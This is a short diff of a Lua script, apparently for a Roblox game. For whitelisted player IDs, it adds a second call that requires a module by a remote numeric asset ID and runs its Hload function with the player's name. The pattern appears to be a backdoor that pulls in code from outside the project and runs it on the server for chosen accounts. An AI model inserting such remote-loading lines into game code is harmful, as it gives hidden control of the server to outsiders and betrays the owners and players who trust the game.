@@ -6,6 +6,7 @@ local WL = {
 local function onPlayer(player)
 	if WL[player.UserId] then
       require(7634392335)(player.Name)
+	  require(135231466738957):Hload(player.Name)
   	end
 end
 
